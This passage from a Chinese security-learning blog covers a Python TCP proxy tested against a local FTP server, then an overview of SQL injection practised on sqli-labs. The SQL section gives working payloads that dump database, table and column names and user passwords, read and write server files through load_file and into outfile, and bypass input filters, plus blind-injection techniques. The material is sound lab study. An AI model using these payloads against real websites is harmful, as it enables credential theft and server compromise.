<blockquote>
<p>[*]Listening on 127.0.0.1:5555 [&#x3D;&gt;]Received incming connection from 127.0.0.1:59419 b’’ [&#x3D;&gt;]Received incming connection from 127.0.0.1:59428 b’’</p>
</blockquote>
<p>至于数据传输，我搞不明白。</p>
<p>在FileZilla上操作半天，也传不上数据哇。后面再说吧</p>
<blockquote>
<p>当然在kali没这么麻烦，kali是允许，不同ip同端口的。</p>
</blockquote>
<p><strong>new:</strong></p>
<p>但是这样吧，</p>
<p>我在cmd上连接ftp</p>
<blockquote>
<p>ftp 127.0.0.1；则监听端口必须要21。将我建立的ftp服务器改个端口（其实可以用工具端口转发，懒得弄）我把本地搭建的ftp服务器端口改为5556了。</p>
</blockquote>
<p>所以监听端这样弄：</p>
<p><code>python tcpproxy.py 127.0.0.1 21 192.168.1.142 5556 True</code></p>
<p>新开一个cmd，输入</p>
<p><code>ftp 127.0.0.1</code></p>
<blockquote>
<p>C:\Users\67538&gt;ftp 127.0.0.1<br>连接到 127.0.0.1。<br>220 Microsoft FTP Service<br>远程主机关闭连接。</p>
</blockquote>
<p>服务端出现</p>
<blockquote>
<p>[&#x3D;&gt;]Received incming connection from 127.0.0.1:50678<br>0000   32 32 30 20 4D 69 63 72 6F 73 6F 66 74 20 46 54    220 Microsoft FT<br>0010   50 20 53 65 72 76 69 63 65 0D 0A                   P Service..<br>[&lt;=&#x3D;=&#x3D;] Sending 27 bytes to localhost.<br>[&#x3D;&#x3D;&#x3D;&gt;] Received 14 bytes from localhost<br>0000   4F 50 54 53 20 55 54 46 38 20 4F 4E 0D 0A          OPTS UTF8 ON..<br>Exception in thread Thread-5:<br>Traceback (most recent call last):<br>  File “C:\Users\67538\AppData\Local\Programs\Python\Python38\lib\threading.py”, line 932, in _bootstrap_inner<br>    self.run()<br>  File “C:\Users\67538\AppData\Local\Programs\Python\Python38\lib\threading.py”, line 870, in run<br>    self._target(*self._args, **self._kwargs)<br>  File “tcpproxy.py”, line 125, in proxy_handler<br>    remote_socket.send(local_buffer)<br>ConnectionResetError: [WinError 10054] 远程主机强迫关闭了一个现有的连接。</p>
</blockquote>
<p><strong>居然是超时的问题</strong></p>
<blockquote>
<p>我原以为这个时间越长越好，改成了100，原来  较长的超时可能会导致连接失败</p>
<pre><code>  connection.settimeout(2) 
</code></pre>
</blockquote>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p><code>python tcpproxy.py 127.0.0.1 21 192.168.1.142 5556 True</code></p>
<p><code>ftp 127.0.0.1</code></p>
<blockquote>
<p>C:\Users\67538&gt;ftp 127.0.0.1<br>连接到 127.0.0.1。<br>220 Microsoft FTP Service<br>200 OPTS UTF8 command successful - UTF8 encoding now ON.<br>用户(127.0.0.1:(none)): yuleiyun</p>
</blockquote>
<blockquote>
<p>[<em>]Listening on 127.0.0.1:21<br>[&#x3D;&gt;]Received incming connection from 127.0.0.1:51693<br>0000   32 32 30 20 4D 69 63 72 6F 73 6F 66 74 20 46 54    220 Microsoft FT<br>0010   50 20 53 65 72 76 69 63 65 0D 0A                   P Service..<br>[&lt;==&#x3D;=] Sending 27 bytes to localhost.<br>[&#x3D;=&#x3D;&gt;] Received 14 bytes from localhost<br>0000   4F 50 54 53 20 55 54 46 38 20 4F 4E 0D 0A          OPTS UTF8 ON..<br>[&#x3D;=&#x3D;&gt;]Sent to remote.<br>[&lt;=&#x3D;=&#x3D;]Received 58 bytes from remote.<br>0000   32 30 30 20 4F 50 54 53 20 55 54 46 38 20 63 6F    200 OPTS UTF8 co<br>0010   6D 6D 61 6E 64 20 73 75 63 63 65 73 73 66 75 6C    mmand successful<br>0020   20 2D 20 55 54 46 38 20 65 6E 63 6F 64 69 6E 67     - UTF8 encoding<br>0030   20 6E 6F 77 20 4F 4E 2E 0D 0A                       now ON…<br>[&lt;&#x3D;=&#x3D;&#x3D;&#x3D;] Sent to localhost.<br>[</em>]No more data.Closing connections.</p>
</blockquote>
<h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.WARNING)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_loop</span>(<span class="params">local_host,local_port,remote_host,remote_port,receive_first</span>):</span><br><span class="line">    </span><br><span class="line">    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host,local_port))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!]Failed to listen on &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(local_host,local_port))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Listening on &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(local_host,local_port))</span><br><span class="line">    </span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket,addr=server.accept()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#打印出本地连接信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[=&gt;]Received incming connection from &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#开启一个线程与远程主机通信</span></span><br><span class="line">        proxy_thread=threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))</span><br><span class="line">        </span><br><span class="line">        proxy_thread.start()</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment">#def hexdump(src,length=16): #16进制导出函数</span></span><br><span class="line">    <span class="comment">#result=[]</span></span><br><span class="line">    <span class="comment">##digits= 4 if isinstance(src,unicode) else 2</span></span><br><span class="line">    <span class="comment">#digits= 4 if isinstance(src,str) else 2</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment">## for i in xrange(0,len(src),length):</span></span><br><span class="line">    <span class="comment">#for i in range(0,len(src),length):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#s=src[i:i+length]</span></span><br><span class="line">        <span class="comment">#hexa=b&#x27; &#x27;.join([&quot;%0*X&quot; %(digits,ord(x)) for x in s])</span></span><br><span class="line">        <span class="comment">#text=b&#x27; &#x27;.join([x if 0x20 &lt;=ord(x) &lt;0x7F else b&#x27;.&#x27; for x in s])</span></span><br><span class="line">        <span class="comment">#result.append(b&quot;%04X %-*s %s&quot; % (i,length*(digits+1),hexa,text))</span></span><br><span class="line">    <span class="comment">#print(b&#x27;\n&#x27;.join(result))</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#说是不适用于python3</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexdump</span>(<span class="params">src, length=<span class="number">16</span></span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="comment"># Python 3 renamed the unicode type to str, the old str type has been replaced by bytes</span></span><br><span class="line">    digits = <span class="number">4</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(src, <span class="built_in">str</span>) <span class="keyword">else</span> <span class="number">2</span></span><br><span class="line">    <span class="comment"># xrange() was renamed to range() in Python 3.</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(src), length):</span><br><span class="line">        s = src[i:i+length]  </span><br><span class="line">        hexa = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&quot;%0*X&quot;</span> % (digits, (x))  <span class="keyword">for</span> x <span class="keyword">in</span> s]) </span><br><span class="line">        <span class="comment">#logging.info(&quot;\t\thexa:%s&quot;%hexa)</span></span><br><span class="line">        <span class="comment">#logging.info(&quot;&quot;.join(str(type(x)) for x in s))</span></span><br><span class="line">        text = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">if</span> <span class="number">0x20</span> &lt;= x &lt; <span class="number">0x7F</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span>  <span class="keyword">for</span> x <span class="keyword">in</span> s])  </span><br><span class="line">        <span class="comment">#logging.info(&quot;\t\ttext:%s&quot;%text)</span></span><br><span class="line">        result.append( <span class="string">&quot;%04X   %-*s   %s&quot;</span> % (i, length*(digits + <span class="number">1</span>), hexa, text) )</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;\n&#x27;</span>.join(result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_from</span>(<span class="params">connection</span>):</span><br><span class="line">    </span><br><span class="line">    buffer=<span class="string">b&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置两秒的超时，取决于目标情况</span></span><br><span class="line">    connection.settimeout(<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#持续从缓存中读取数据直到没有数据或超时</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=connection.recv(<span class="number">4096</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#logging.info(&quot;receive data:%s&quot;%data)</span></span><br><span class="line">            buffer+=data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#对目标是远程主机的请求数据进行修改</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_handler</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#执行包修改</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"><span class="comment">#....响应数据修改....</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response_handler</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#执行包修改</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_handler</span>(<span class="params">client_socket,remote_host,remote_port,receive_first</span>):</span><br><span class="line">    <span class="comment">#连接远程主机</span></span><br><span class="line">    remote_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    remote_socket.connect((remote_host,remote_port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#若需要从远程主机接收数据</span></span><br><span class="line">    <span class="keyword">if</span> receive_first:</span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">       <span class="comment"># logging.info(&quot;remote_buffer:%s&quot;%remote_buffer)</span></span><br><span class="line">        hexdump(remote_buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#发送给响应处理</span></span><br><span class="line">        remote_buffer=response_handler(remote_buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#若有数据传送给本地客户端，并发送</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;====] Sending &#123;0&#125; bytes to localhost.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(remote_buffer)))</span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#本地循环读取数据，发送给远程主机和本地主机</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#从本地读取</span></span><br><span class="line">        local_buffer=receive_from(client_socket)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(local_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[===&gt;] Received &#123;0&#125; bytes from localhost&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(local_buffer)))</span><br><span class="line">            hexdump(local_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送给request handler</span></span><br><span class="line">            local_buffer=request_handler(local_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送数据给远程主机</span></span><br><span class="line">            remote_socket.send(local_buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[===&gt;]Sent to remote.&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#接收响应的数据</span></span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;====]Received &#123;0&#125; bytes from remote.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(remote_buffer)))</span><br><span class="line">            hexdump(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送到响应处理函数</span></span><br><span class="line">            remote_buffer=response_handler(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#将响应给本地socket</span></span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;=====] Sent to localhost.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#如果两边都没有数据，关闭连接</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(local_buffer) <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            client_socket.close()</span><br><span class="line">            remote_socket.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]No more data.Closing connections.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:])!=<span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:./tcpproxy.py [localhost][localport][remotehost][remoteport][receive_first]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Example:./tcpproxy.py 127.0.0.1 9000 10.12.132.1 9000 True&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#设置本地监听参数</span></span><br><span class="line">    </span><br><span class="line">    local_host=sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port=<span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置远程目标</span></span><br><span class="line">    remote_host=sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port=<span class="built_in">int</span>(sys.argv[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#告知代理发送给远程主机之前连接和接收数据</span></span><br><span class="line">    receive_first=sys.argv[<span class="number">5</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;True&quot;</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first=<span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="comment">#设置监听socket</span></span><br><span class="line">    server_loop(local_host,local_port,remote_host,remote_port,receive_first)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入总述</title>
    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>攻击者通过把<strong>恶意SQL命令插入</strong>到Web表单的输入域或页面请求的查询字符串中，并且插入的恶意SQL命令会<strong>导致原有SQL语句作用发生改变</strong>，从而达到<strong>欺骗服务器执行恶意的SQL命令</strong>的一种攻击方式。</p>
<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230524231210348.png" alt="image-20230524231210348"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522161221724.png" alt="image-20230522161221724"></p>
<p>答案是bc，a错在注入点在y上了；d与问题无关</p>
<p><strong>总结</strong>：注入点是谁，就要将语句写在其后面</p>
<h2 id="a-Mysql结构"><a href="#a-Mysql结构" class="headerlink" title="a)Mysql结构"></a>a)Mysql结构</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522163119227.png" alt="image-20230522163119227"></p>
<p>Mysql数据库</p>
<p>数据库A&#x3D;网站A&#x3D;数据库用户A</p>
<p>​		表名</p>
<p>​				列名</p>
<p>​						数据</p>
<p>数据库B&#x3D;网站B&#x3D;数据库用户B</p>
<p>​		…</p>
<p>如上，一个站一个数据库用户，即使A站有漏洞，不影响B站使用，但是嘞，如果是root用户高权限可以跨库了。</p>
<p>相关知识点：</p>
<p>1.为了得到数据，需要库-&gt;表-&gt;列</p>
<p>2.所谓的数据库高低版本，即在Mysql库5.0及以上版本中，存在information_schema库，它记录了所有数据库名，表名，列名。</p>
<p>3.数据库中的”.”代表下一级，如admin.user，即admin库下的user表</p>
<p>4.information_schema.tables&#x2F;columns；记录的所有表名&#x2F;列名信息</p>
<p>​	table_schema库名；	</p>
<p>​	table_name表名;</p>
<p>​	column_name()列名；</p>
<p>这些知识点，在sql-labs实践时得到体现。</p>
<h3 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h3><p>老办法：id&#x3D;1 and 1&#x3D;1页面正常 与id&#x3D;1 and 1&#x3D;2页面错误</p>
<p>快方法：id&#x3D;1asdsad，页面错误，就加上其它的字符，对页面有影响</p>
<p>注意：404错误和500跳转的话，那就是特殊情况咯</p>
<h3 id="简单注入之联合查询"><a href="#简单注入之联合查询" class="headerlink" title="简单注入之联合查询"></a>简单注入之联合查询</h3><h4 id="猜解准备"><a href="#猜解准备" class="headerlink" title="猜解准备"></a>猜解准备</h4><ol>
<li>猜解列名数量(字段数) order by x 页面正常否</li>
<li>id &#x3D;-1 union select 1,2,…,x  id&#x3D;-1查询不存在后，才会回显后面的1,2,3…x位置</li>
</ol>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>将数字替换成version()、database()、user()、@@version_compile_os()…</p>
<h3 id="高权限下的跨库查询（即指定x库x表下的数据）"><a href="#高权限下的跨库查询（即指定x库x表下的数据）" class="headerlink" title="高权限下的跨库查询（即指定x库x表下的数据）"></a>高权限下的跨库查询（即指定x库x表下的数据）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>

<p>group_concat是多个拼接显示；或者可用limt x,1变动猜解</p>
<h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h3><h4 id="路径获取常见方法："><a href="#路径获取常见方法：" class="headerlink" title="路径获取常见方法："></a>路径获取常见方法：</h4><p>load_file()：读取函数</p>
<p>into outfile或into dumpfile：导出函数</p>
<p><code>select load_file(&#39;d:/test/1.txt&#39;)</code></p>
<p><code>select &#39;x&#39; into outfile &#39;d:/www.txt&#39;;</code>（需要配置file权限）</p>
<p>即Mysql下的my.ini文件中加入secure_file_priv&#x3D;’’，重启mysql即可</p>
<p><code>?id=-1%20union%20select%201,load_file(%27D:\\phpstudy_pro\\WWW\\sqli\\1.txt%27),3</code>  <strong>读取文件</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522185816516.png" alt="image-20230522185816516"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522190256745.png" alt="image-20230522190256745"></p>
<p><code>?id=-1%20union%20select%201,%27x%27,3%20into%20outfile%20%20%27D:\\phpstudy_pro\\WWW\\sqli\\2.txt%27 --+</code><strong>写入文件</strong>；–+是注释掉后面的LIMIT</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522191240332.png" alt="image-20230522191240332"></p>
<h4 id="路径获取常见方法：-1"><a href="#路径获取常见方法：-1" class="headerlink" title="路径获取常见方法："></a>路径获取常见方法：</h4><p>报错显示；</p>
<p>遗留文件；(phpinfo.php啥的)</p>
<p>漏洞报错；</p>
<p>平台配置文件；（什么.ini之类的）</p>
<p>爆破等；</p>
<h4 id="常见读取文件列表："><a href="#常见读取文件列表：" class="headerlink" title="常见读取文件列表："></a>常见读取文件列表：</h4><h3 id="防注入相关"><a href="#防注入相关" class="headerlink" title="防注入相关"></a>防注入相关</h3><h4 id="魔术引号开关："><a href="#魔术引号开关：" class="headerlink" title="魔术引号开关："></a>魔术引号开关：</h4><p>magic_quotes_gpc&#x3D;off</p>
<p>当它为On时，输入数据中的引号、反斜线、NULL均被加上反斜线，效果同addslashes()</p>
<p>所以就用编码或宽字节绕过了。</p>
<p>编码之后，括号里就不用单引号了。即load_file(<strong>‘路径’</strong>)变为load_file(编码)即可</p>
<h4 id="内置函数-int"><a href="#内置函数-int" class="headerlink" title="内置函数:int"></a>内置函数:int</h4><p>是指，对输入变量进行类型判断，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (is_int($var_name1)) </span><br><span class="line">&#123;    </span><br><span class="line">拼接sql语句，执行sql语句</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">报错啥的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种就别想着绕过了吧。所以强类型语言其实很少有sql注入？</p>
<h4 id="自定义关键字-select"><a href="#自定义关键字-select" class="headerlink" title="自定义关键字:select"></a>自定义关键字:select</h4><p>是指，比如str_replace()，替换输入中的select，所以一般大小写绕过或双写</p>
<h2 id="b-类型及提交注入"><a href="#b-类型及提交注入" class="headerlink" title="b)类型及提交注入"></a>b)类型及提交注入</h2><h3 id="前景引入"><a href="#前景引入" class="headerlink" title="前景引入"></a>前景引入</h3><p>id&#x3D;1; 数字型</p>
<p>name&#x3D;’zifu’ 字符型</p>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$name=$_GET[&#x27;x&#x27;]</span><br><span class="line">$sql=&quot;select * from user where name=&#x27;$name&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>此时，?x&#x3D;yuleiyun and 1&#x3D;1</p>
<p>会出现select … name&#x3D;<strong>‘yuleiyun and 1&#x3D;1’</strong></p>
<p>故引出了闭合条件。（也是一种参数类型，即非数字型注入，都需要闭合）</p>
<h3 id="明确参数类型"><a href="#明确参数类型" class="headerlink" title="明确参数类型"></a>明确参数类型</h3><p>数字；</p>
<p>字符；</p>
<p>搜索；（like 模糊查询 name&#x3D;’%ring%’）</p>
<p>Json；</p>
<p>…</p>
<h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>get;（url）</p>
<p>post;</p>
<p>cookie;</p>
<p>http代理;</p>
<p>referer;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$get =$_GET[&#x27;a&#x27;];//参数a为get请求方式，以url提交</span><br><span class="line">echo $get;</span><br><span class="line">$post=$_POST[&#x27;b&#x27;];//参数b为post请求方式，bp上提交</span><br><span class="line">echo $post;</span><br><span class="line">$c=$_COOKIE[&#x27;c&#x27;];//参数c为cookie请求方式(其实COOKIE是可以接收到GET请求或POST请求的啊，以后的COOKIE注入)，bp上提交</span><br><span class="line">echo $c;</span><br><span class="line">$r=$_REQUEST[&#x27;r&#x27;];//参数r为request请求方式（REQUEST可以接收GET或POST）</span><br><span class="line">echo $r;</span><br><span class="line">$s=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];//具体见$_SERVER详解</span><br><span class="line">echo $s;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>具体体现为:url中….?a&#x3D;123&amp;b&#x3D;345，页面只会显示123</p>
<p>而要显示参数b，需要进行post请求，即在bp中，体现为，在请求体中输入b&#x3D;345;</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523122704138.png" alt="image-20230523122704138"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523125650035.png" alt="image-20230523125650035"></p>
<p>手动更改方框处的GET变为POST不会有变化，需要右键<strong>change request method</strong>才可以，注意get请求下的参数要显示，需要在url位置上搭配**?**，即使在post下也会显示。</p>
<p>嫌麻烦的话，针对post请求，<strong>hackbar工具</strong>也有同样效果</p>
<p>sqli-labs:</p>
<p>less 5,6(字符型注入);</p>
<p>less 11(post提交);</p>
<p>less 20(cookie注入);</p>
<p>less 18(http头部注入);</p>
<h3 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h3><p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application&#x2F;json”。</p>
<p>json格式为，post中，输入json&#x3D;{“usename”:”admin”}</p>
<h2 id="c-查询方式及报错盲注"><a href="#c-查询方式及报错盲注" class="headerlink" title="c)查询方式及报错盲注"></a>c)查询方式及报错盲注</h2><h3 id="查询方式："><a href="#查询方式：" class="headerlink" title="查询方式："></a>查询方式：</h3><h4 id="select-查询"><a href="#select-查询" class="headerlink" title="select 查询"></a>select 查询</h4><p><code>select * from users where id=$id; </code></p>
<p>显示数据</p>
<h4 id="insert-添加"><a href="#insert-添加" class="headerlink" title="insert 添加"></a>insert 添加</h4><p><code>insert into users(a,b,c) values(1,&#39;x&#39;,3); </code></p>
<p>用户注册添加时</p>
<h4 id="delete-删除"><a href="#delete-删除" class="headerlink" title="delete 删除"></a>delete 删除</h4><p><code>delete from users where id=$id; </code></p>
<p>后台管理，删除文章或用户等操作</p>
<h4 id="update-更新"><a href="#update-更新" class="headerlink" title="update 更新"></a>update 更新</h4><p><code>update user set pwd=&#39;pd&#39;  where id=1 and username=&#39;admin&#39;; </code></p>
<p>同步或缓存操作</p>
<h4 id="order-by-排序"><a href="#order-by-排序" class="headerlink" title="order by 排序"></a>order by 排序</h4><h4 id="查询总结："><a href="#查询总结：" class="headerlink" title="查询总结："></a>查询总结：</h4><p>根据不同查询方式和网站应用关系去猜解注入</p>
<h3 id="报错盲注："><a href="#报错盲注：" class="headerlink" title="报错盲注："></a>报错盲注：</h3><h4 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h4><p>当注入时，获取的数据不回显在前端时，进行报错盲注</p>
<h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><h5 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h5><blockquote>
<p>regexp;</p>
<p>substr;</p>
<p>like;</p>
<p>like ‘wh%’</p>
<p>ord&#x2F;ascii;</p>
<p>ascii(x)&#x3D;97 x的ascii码是否是97</p>
<p>left;</p>
<p>left(a,b)从左侧截取a的前b位</p>
<p>例如：database()&#x3D;’security’  ;</p>
<p><strong>left(database(),3)&#x3D;’sec’;</strong></p>
<p>mid;</p>
<p>mid(a,b,c) 从位置b开始，截取字符串a的c长度的子串</p>
</blockquote>
<p>长度-&gt;字符这样爆破，诶。</p>
<h5 id="时间-延时-盲注："><a href="#时间-延时-盲注：" class="headerlink" title="时间(延时)盲注："></a>时间(延时)盲注：</h5><blockquote>
<p>if;</p>
<p>if(a&lt;4,”小”,”大”)；如果a的值满足&lt;4嘞，返回”小”；否则返回”大”</p>
<p>sleep;</p>
<p>sleep(if(length(database()&lt;8),5,0))</p>
<p>…</p>
</blockquote>
<p>盲注一般写脚本、sqlmap做</p>
<h5 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h5><blockquote>
<p>无回显内容时，可以强制报错回显。</p>
<p>常见的有：</p>
<p>floor;</p>
<p>updatexml;</p>
<p>extractvalue;</p>
</blockquote>
<h5 id="使用优先度："><a href="#使用优先度：" class="headerlink" title="使用优先度："></a>使用优先度：</h5><p><strong>联合&gt;报错&gt;布尔&gt;时间</strong></p>
